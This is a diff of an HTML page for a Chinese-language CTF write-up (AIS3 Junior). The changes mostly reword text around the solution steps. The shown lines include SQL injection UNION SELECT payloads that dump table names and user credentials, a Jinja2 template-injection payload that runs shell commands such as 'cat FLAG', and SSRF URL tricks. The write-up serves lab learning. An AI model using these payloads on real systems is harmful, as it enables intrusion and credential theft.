@@ -1220,8 +1220,7 @@
   </div>
 
   <div class="note p-4 mb-4 rounded-small info">
-    <p>可以使用 <code>UNION SELECT (num) #</code> 來測試查詢的有效欄位數，<br>
-當 (num) 填入 <code>1</code>、<code>1,2</code>、<code>1,2,3</code> 時，系統都報錯了。<br>
+    <p>可以使用 <code>UNION SELECT (num) #</code> 來測試查詢的有效欄位數，當 (num) 填入 <code>1</code>、<code>1,2</code>、<code>1,2,3</code> 時，系統都報錯了。<br>
 而填入 <code>1,2,3,4</code> 時不再報錯，說明這個資料庫的查詢需要匹配四個欄位！<img  
                      lazyload
                      src="/images/loading.svg"
@@ -1243,7 +1242,7 @@
   </div>
 
   <div class="note p-4 mb-4 rounded-small info">
-    <p>在選定 ApexPredators 資料庫後，使用 <code>UNION SELECT</code> 及 <code>group_concat(table_name)</code> 從 information_schema.tables 中查詢該資料庫的所有表格名稱。<br>
+    <p>選定 ApexPredators 資料庫後，使用 <code>UNION SELECT</code> 及 <code>group_concat(table_name)</code> 從 information_schema.tables 中查詢該資料庫的所有表格名稱。<br>
 <code>' UNION SELECT 1,group_concat(table_name),3,4 from information_schema.tables WHERE table_schema='ApexPredators' #</code> <img  
                      lazyload
                      src="/images/loading.svg"
@@ -1265,7 +1264,7 @@
   </div>
 
   <div class="note p-4 mb-4 rounded-small info">
-    <p>鎖定 ApexPredators.users 欄位，使用 <code>UNION SELECT 1,username,isAdmin,password</code> 來提取用戶名、是否為管理員及密碼等重要資訊<br>
+    <p>鎖定 ApexPredators.users 欄位，使用 <code>UNION SELECT 1,username,isAdmin,password</code> 提取帳號、密碼及是否為管理員等重要資訊<br>
 <code>' UNION SELECT 1,username,isAdmin,password FROM ApexPredators.users #</code> <img  
                      lazyload
                      src="/images/loading.svg"
@@ -1309,7 +1308,7 @@
   </div>
 
   <div class="note p-4 mb-4 rounded-small info">
-    <p>利用在<a class="link"   target="_blank" rel="noopener" href="https://github.com/HHousen/hack-the-box/blob/master/Challenges/Web/Templated/README.md" >網路上找到的payload<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>
+    <p>利用<a class="link"   target="_blank" rel="noopener" href="https://github.com/HHousen/hack-the-box/blob/master/Challenges/Web/Templated/README.md" >在網路上找到的payload<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>
 <code>self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read()</code> <img  
                      lazyload
                      src="/images/loading.svg"
@@ -1320,8 +1319,8 @@
   </div>
 
   <div class="note p-4 mb-4 rounded-small info">
-    <p>裡面有個 FLAG 檔案，我們可以稍微修改 payload<br>
-<code>self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat FLAG').read()</code> 讓它印出 FLAG 內容 <img  
+    <p>裡面有個 FLAG 檔案，我們可以稍微修改 payload，讓它印出 FLAG 內容<br>
+<code>self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat FLAG').read()</code> <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/images/AIS3-Junior-writeup/STI01-3.png"
@@ -1337,8 +1336,8 @@
 <h3 id="STI-02">STI 02</h3>
 
   <div class="note p-4 mb-4 rounded-small info">
-    <p>利用與上題同樣的payload<br>
-<code>self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat FLAG').read()</code>，即可取得FLAG <img  
+    <p>利用與上題同樣的payload，即可取得FLAG<br>
+<code>self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat FLAG').read()</code> <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/images/AIS3-Junior-writeup/STI02-1.png"
@@ -1375,11 +1374,11 @@
   </div>
 
   <div class="note p-4 mb-4 rounded-small info">
-    <p>因為題目有提到，FLAG 藏在 <code>/app/FLAG</code> 中。<br>
-所以我將 url 改為 <code>/app/FLAG</code> 後重新送出看看，並成功在原始碼中發現編碼過的字串 <img  
+    <p>因為題目提到 FLAG 藏在 <code>/app/FLAG</code> 中，將 url 改為 <code>/app/FLAG</code> 後重新送出即可在原始碼中發現編碼過的字串<br>
+<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/AIS3-Junior-writeup/STI01-3.png"
+                     data-src="/images/AIS3-Junior-writeup/SRF01-3.png"
                       alt="image"
                 ></p>
 
@@ -1402,7 +1401,7 @@
   </div>
 
   <div class="note p-4 mb-4 rounded-small info">
-    <p>題目雖然沒有說 FLAG 藏在哪裡，但<s>我通靈推測藏在 localhost 中</s> <img  
+    <p>題目雖然沒有說 FLAG 藏在哪裡，但 <s>我通靈推測藏在 localhost 中</s> <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/images/AIS3-Junior-writeup/SRF02-1.png"
